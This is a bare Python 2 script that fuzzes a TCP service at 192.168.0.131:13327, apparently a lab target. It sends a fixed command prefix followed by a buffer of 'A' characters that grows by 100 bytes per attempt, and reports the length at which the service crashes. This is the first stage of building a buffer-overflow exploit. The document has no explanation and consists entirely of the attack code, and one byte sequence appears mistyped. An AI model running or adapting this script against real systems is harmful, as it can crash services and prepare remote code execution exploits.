import sys, socket
from time import sleep

buffer ="A" * 100
pre_buff="\x11(setup sound "

post_buff = "x90\x00#"

while True: 
        try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.0.131',13327))
             print "Trying with buffer length %d" % len(buffer)
             s.send((pre_buff + buffer + post_buff))
             s.close()
             sleep(1)
             buffer=buffer + "A"*100


        except: 
                print("Fuzzing Crashed at %s by" % str(len(buffer)))
                sys.exit()     